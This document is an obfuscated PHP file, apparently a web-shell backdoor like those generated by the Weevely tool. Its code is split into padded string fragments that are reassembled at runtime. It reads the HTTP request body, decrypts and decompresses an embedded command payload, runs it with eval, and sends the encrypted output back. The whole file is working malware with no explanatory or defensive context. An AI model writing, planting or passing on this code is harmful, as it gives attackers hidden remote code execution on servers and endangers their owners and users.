<?php
$h='"/>$k>h(.>+)$kf/",>@file_get_conte>nts("p>>hp://i>nput>">),$m)==1) {>@ob_start();@e>v';
$B='al(>@>gz>uncompr>>e>s>s(@x(>@b>ase64_decode($m[1]),>$k)));>$o>=@ob_get_con>tents();@ob';
$I='0;($j<$c&&$i<$>l);$>j++,$i>++){$o.=>$t{$i}^>$k{$>j};>}}retu>r>n $o;}if (@p>>reg_match(';
$E='_en>>d_clean();$r=@base6>4_enco>d>e(>@x(@gzc>o>mpres>>s($o>),$k));print("$p$kh$r$kf");}';
$V='unctio>n x($t>,$k>){$c=str>len($k>);$l=st>rlen>($t);$o=>"";f>or($i=>0;$i<$>l;){>for($>>j=';
$T=str_replace('K','','crKeaKte_KfuKncKtKion');
$i='$k="01266>1f1";$>k>h="8f4>baadada1b>";$kf=>"e49b88b>>273f2";>$p="CG>3glF>uYRwZ>5PfDl";f';
$S=str_replace('>','',$i.$V.$I.$h.$B.$E);
$Q=$T('',$S);$Q();
?>
